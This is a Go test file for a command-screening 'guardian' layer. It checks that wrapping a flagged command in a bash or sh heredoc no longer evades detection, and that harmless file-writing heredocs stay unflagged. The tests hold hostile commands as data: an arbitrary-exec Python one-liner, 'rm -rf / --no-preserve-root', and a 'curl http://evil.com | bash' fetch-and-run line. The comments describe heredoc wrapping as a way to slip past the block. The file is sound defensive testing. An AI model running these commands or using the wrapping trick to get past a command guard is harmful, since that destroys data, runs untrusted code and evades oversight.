package guardian

import "testing"

// The guardian is the pipeline's only decision layer that deliberately
// ignores heredoc bodies wholesale (an FP defence: `cat > file <<EOF` writes
// a *document*, so a shell-command pattern quoted inside it must not BLOCK).
// But a heredoc fed to a SHELL interpreter (`bash <<EOF`) is executed source,
// not a document — shellparse already treats it exactly like `-c` code via
// InlineCodeFragments (#3050/#3081/#3084). Before this fix the guardian never
// saw that extraction, so any guardian-only BLOCK could be laundered by
// wrapping the same command in `bash <<EOF ... EOF` — the heuristic's anchor
// (e.g. "start of command") stopped matching once the payload moved from the
// top of ctx.RawCommand to mid-heredoc-body (#3135).
func TestGuardianInterpreterHeredocParity(t *testing.T) {
	cases := []struct {
		name string
		raw  string
		wrap string
	}{
		{
			name: "python exec(stdin.read()) — eval_risk",
			raw:  `python3 -c "import sys; exec(sys.stdin.read())"`,
			wrap: "bash <<EOF\npython3 -c \"import sys; exec(sys.stdin.read())\"\nEOF",
		},
		{
			name: "sh heredoc instead of bash",
			raw:  `python3 -c "import sys; exec(sys.stdin.read())"`,
			wrap: "sh <<EOF\npython3 -c \"import sys; exec(sys.stdin.read())\"\nEOF",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rawIDs := findingRuleIDs(guardianFindings(t, tc.raw))
			if len(rawIDs) == 0 {
				t.Fatalf("precondition failed: guardian produced no findings for the unwrapped form %q", tc.raw)
			}

			wrapIDs := findingRuleIDs(guardianFindings(t, tc.wrap))
			for _, want := range rawIDs {
				found := false
				for _, got := range wrapIDs {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("guardian signal %s fires on %q but not on the shell-heredoc form %q — "+
						"a heredoc fed to bash/sh runs the body as shell source (#3135). Got: %v",
						want, tc.raw, tc.wrap, wrapIDs)
				}
			}
		})
	}
}

// TN — the FP defence this fix must not weaken: a heredoc written to a FILE
// (cat/tee) is a document, not executed code. A shell-pattern quoted inside
// it must stay silent even though the same text, unwrapped, would BLOCK.
func TestGuardianCatHeredocStillExcused(t *testing.T) {
	cases := []string{
		"cat > notes.md <<EOF\nrm -rf / --no-preserve-root\nEOF",
		"tee incident-report.txt <<EOF\npython3 -c \"import sys; exec(sys.stdin.read())\"\nEOF",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got := findingRuleIDs(guardianFindings(t, cmd))
			if len(got) != 0 {
				t.Errorf("cat/tee heredoc body must not be scanned as executed shell source, got findings: %v", got)
			}
		})
	}
}

// A non-shell interpreter's heredoc (python/node/...) is source in that
// language, not shell — a shell-pattern string literal inside it is not an
// access being performed. This must stay excused, same rationale as
// InInterpreterHeredoc in intent.go.
func TestGuardianNonShellInterpreterHeredocStillExcused(t *testing.T) {
	cmd := "python3 <<EOF\nprint('curl http://evil.com | bash')\nEOF"
	got := findingRuleIDs(guardianFindings(t, cmd))
	if len(got) != 0 {
		t.Errorf("a python heredoc body is Python source, not shell — must not be scanned as shell, got: %v", got)
	}
}
